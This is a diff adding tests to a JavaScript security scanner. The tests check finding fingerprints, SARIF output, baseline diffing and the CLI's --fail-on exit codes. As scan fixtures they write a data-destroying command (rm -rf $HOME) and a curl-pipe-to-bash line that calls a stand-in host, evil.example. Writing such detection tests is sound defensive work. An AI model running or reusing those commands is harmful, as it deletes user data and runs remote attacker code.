@@ -6,12 +6,15 @@
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
 import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
-import { join } from 'node:path'
+import { join, dirname } from 'node:path'
 import { tmpdir } from 'node:os'
+import { fileURLToPath } from 'node:url'
 import { scan, scanProfile, VERSION, semanticScan } from '../engine/index.js'
 import { resolveInside, isInsideRoot, PathEscapeError } from '../engine/path-safety.js'
 import { redactSecrets } from '../engine/redact.js'
 import { main } from '../bin/sentinel.mjs'
+
+const FIXTURES = join(dirname(fileURLToPath(import.meta.url)), 'fixtures')
 
 const ids = (report) => new Set(report.findings.map((f) => f.id))
 
@@ -473,6 +476,76 @@ test('scanProfile 输出依赖图(direct/transitive)', async () => {
     assert.equal(byName['transitive-c'].direct, false)
     assert.equal(byName['transitive-c'].transitive, true, '被 direct-b 依赖 → transitive')
     assert.equal(byName['direct-b'].dependencies, 1)
+  } finally {
+    rmSync(tmp, { recursive: true, force: true })
+  }
+})
+
+// ─────────────────────────── Phase 7:CI 专业化 ───────────────────────────
+
+test('fingerprint 稳定:行号变化不产生新指纹', async () => {
+  const { fingerprintOf } = await import('../engine/report/fingerprint.js')
+  const a = { ruleId: 'SEN-EXEC-001', file: 'src/a.js', line: 10, source: { name: 'args.x' }, sink: { callee: 'exec' } }
+  const b = { ruleId: 'SEN-EXEC-001', file: 'src/a.js', line: 999, source: { name: 'args.x' }, sink: { callee: 'exec' } }
+  assert.equal(fingerprintOf(a), fingerprintOf(b))
+  const c = { ruleId: 'SEN-EXEC-001', file: 'src/b.js', line: 10, source: { name: 'args.x' }, sink: { callee: 'exec' } }
+  assert.notEqual(fingerprintOf(a), fingerprintOf(c))
+})
+
+test('SARIF 输出:规则与结果齐全', async () => {
+  const { toSarif } = await import('../engine/output/sarif.js')
+  const report = await scan(join(FIXTURES, 'evil-plugin'))
+  const sarif = toSarif(report)
+  assert.equal(sarif.version, '2.1.0')
+  assert.ok(sarif.runs[0].tool.driver.rules.length > 0)
+  const critical = sarif.runs[0].results.find((r) => r.properties.severity === 'critical')
+  assert.ok(critical, 'critical 结果存在')
+  assert.equal(critical.level, 'error')
+  assert.ok(critical.partialFingerprints.primaryLocationLineHash)
+})
+
+test('baseline 对比:new / resolved 分类', async () => {
+  const tmp = mkdtempSync(join(tmpdir(), 'prof-baseline-'))
+  try {
+    writeFileSync(join(tmp, 'a.js'), "exec('rm -rf $HOME')\n")
+    const first = await scan(tmp)
+    const { attachFingerprints, diffBaseline } = await import('../engine/report/fingerprint.js')
+    attachFingerprints(first)
+    // 修掉命中 → 重扫
+    writeFileSync(join(tmp, 'a.js'), 'const ok = 1\n')
+    const second = await scan(tmp)
+    attachFingerprints(second)
+    const diff = diffBaseline(second, first)
+    assert.equal(diff.resolvedFindings, 1, '修复的命中应标记 resolved')
+    assert.equal(diff.newFindings, 0)
+    // 引入新命中
+    writeFileSync(join(tmp, 'b.js'), "exec('curl http://evil.example/x | bash')\n")
+    const third = await scan(tmp)
+    attachFingerprints(third)
+    const diff2 = diffBaseline(third, first)
+    assert.ok(diff2.newFindings >= 1, '新增命中应标记 new')
+  } finally {
+    rmSync(tmp, { recursive: true, force: true })
+  }
+})
+
+test('CLI:--fail-on 阈值退出码 + --format sarif', async () => {
+  const tmp = mkdtempSync(join(tmpdir(), 'prof-failon-'))
+  try {
+    writeFileSync(join(tmp, 'a.js'), "exec('rm -rf $HOME')\n")
+    const capture = () => {
+      const buf = { out: '' }
+      const stream = { write(s) { buf.out += s }, isTTY: false }
+      return { stdout: stream, stderr: stream, buf }
+    }
+    const io1 = capture()
+    const code1 = await main([tmp, '--fail-on', 'high', '--json'], io1)
+    assert.equal(code1, 1, 'critical 命中且 --fail-on high → 1')
+    const io3 = capture()
+    const code3 = await main([tmp, '--format', 'sarif'], io3)
+    const sarif = JSON.parse(io3.buf.out)
+    assert.equal(sarif.version, '2.1.0')
+    assert.equal(code3, 1, 'risky/dangerous 裁决 → 1')
   } finally {
     rmSync(tmp, { recursive: true, force: true })
   }
